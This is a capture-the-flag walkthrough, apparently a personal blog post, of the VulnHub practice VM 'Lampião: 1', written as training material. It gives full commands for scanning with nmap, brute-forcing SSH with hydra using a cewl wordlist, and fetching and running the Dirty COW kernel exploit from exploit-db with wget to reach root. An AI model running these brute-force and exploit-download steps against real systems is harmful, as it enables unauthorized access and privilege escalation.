---
layout: post
date: 2018-08-06 10:42:58 +0000
last_modified_at: 2018-08-06 13:22:13 +0000
title: "Lampião: 1 Walkthrough"
subtitle: "Hero or Villain?"
category: Walkthrough
tags: [VulnHub, "Lampiao"]
comments: true
image:
  feature: lampiao-1-walkthrough.jpg
  credit: Voltordu / Pixabay
  creditlink: https://pixabay.com/en/darth-vader-star-wars-geek-1207142/
---

This post documents the complete walkthrough of Lampião: 1, a boot2root [VM][1] created by [Tiago Tavares][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

"Captain" Virgulino Ferreira da Silva, better known as **Lampião**, was the most famous bandit leader of the Cangaço. The aim is to get `root`.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 46:b1:99:60:7d:81:69:3c:ae:1f:c7:ff:c3:66:e3:10 (DSA)
|   2048 f3:e8:88:f2:2d:d0:b2:54:0b:9c:ad:61:33:59:55:93 (RSA)
|   256 ce:63:2a:f7:53:6e:46:e2:ae:81:e3:ff:b7:16:f4:52 (ECDSA)
|_  256 c6:55:ca:07:37:65:e3:06:c1:d6:5b:77:dc:23:df:cc (ED25519)
80/tcp   open  http?   syn-ack ttl 64
| fingerprint-strings:
|   NULL:
|     _____ _ _
|     |_|/ ___ ___ __ _ ___ _ _
|     \x20| __/ (_| __ \x20|_| |_
|     ___/ __| |___/ ___|__,_|___/__, ( )
|     |___/
|     ______ _ _ _
|     ___(_) | | | |
|     \x20/ _` | / _ / _` | | | |/ _` | |
|_    __,_|__,_|_| |_|
1898/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
```

`nmap` finds `22/tcp`, `80/tcp` and `1898/tcp` open—and there's something interesting behind `80/tcp`.

![Son of a Bitch](/assets/images/posts/lampiao-1-walkthrough/8b3f5f0a.png)

"Fi duma égua" is a not-so-elegant word for referring to someone. I leave it for the curious reader to find out what it means. :laughing:

## Drupal

Another service worth exploring is Drupal, which runs behind `1898/tcp`. Here's how it looks like.

![Drupal](/assets/images/posts/lampiao-1-walkthrough/5e40c98e.png)

To be honest, I'm always excited to see non-English language in display because that means I can generate a wordlist from it. There's always a high chance of getting a password judging from my experience.

Let's use `cewl` to generate a wordlist from the post "**Lampião, herói ou vilão do Sertão?**". The command goes like this.

```
# cewl -w cewl.txt http://192.168.10.130:1898/?q=node/1
# wc -l cewl.txt
835 cewl.txt
```

## Hail Hydra

Notice the two usernames below: `tiago` and `eder`.

![Usernames](/assets/images/posts/lampiao-1-walkthrough/ba3ec0df.png)

Let's put them into a username list and go with `hydra` and the generated wordlist. Perhaps we can get lucky with SSH on our first attempt?

```
# echo tiago > usernames.txt
# echo eder >> usernames.txt
# hydra -L usernames.txt -P cewl.txt -f -e nsr -o hydra.txt -t 4 ssh://192.168.10.130
[22][ssh] host: 192.168.10.130   login: tiago   password: Virgulino
[STATUS] attack finished for 192.168.10.130 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
```

Lucky indeed.

## Low-Privilege Shell

Not too shabby.

![shell](/assets/images/posts/lampiao-1-walkthrough/bd92b620.png)

## Privilege Escalation

Let's perform some basic enumeration to determine what we're dealing with.

```
$ uname -a
Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 14.04.5 LTS
Release:	14.04
Codename:	trusty
```

I'm going to use a [script](https://github.com/mzet-/linux-exploit-suggester) to suggest a couple of local privilege escalation exploits relevant to the distribution and kernel.

```
$ wget -q -O /tmp/linux-exploit-suggester.sh https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
$ chmod +x /tmp/linux-exploit-suggester.sh
$ /tmp/linux-exploit-suggester.sh
...
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847.cpp
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

Let's test the exploit out.

```
$ wget -q -O /tmp/40847.cpp https://www.exploit-db.com/download/40847.cpp
$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
$ ./dcow -s
```

![root](/assets/images/posts/lampiao-1-walkthrough/46ebbd22.png)

Boom.

## What's the Flag (WTF)?

![Flag](/assets/images/posts/lampiao-1-walkthrough/caa45484.png)

:dancer:

I wonder what's the significance of `lampiao.jpg` to the flag. Here's what `lampiao.jpg` looks like.

![Lampião](/assets/images/posts/lampiao-1-walkthrough/lampiao.jpg)

## Afterthought

The VM isn't hard. Don't think too deep, too far. Don't go down the rabbit hole. Tiago (the creator of this VM) laid down a bunch of teasers that may steer you off course.

One good example is `qrc.png` in the Drupal home directory.

![qrc.png](/assets/images/posts/lampiao-1-walkthrough/qrc.png)

It was decoded to "Try harder! muahuahua" :unamused:

Another example was the removal of read permissions of `/etc/cangaco/lampiao.*`. That's a good one. It piqued my curiosity so much I almost pulled out all my hair trying to read them.

[1]: https://www.vulnhub.com/entry/lampiao-1,249/
[2]: https://twitter.com/@tiagotvrs
[3]: https://www.vulnhub.com/
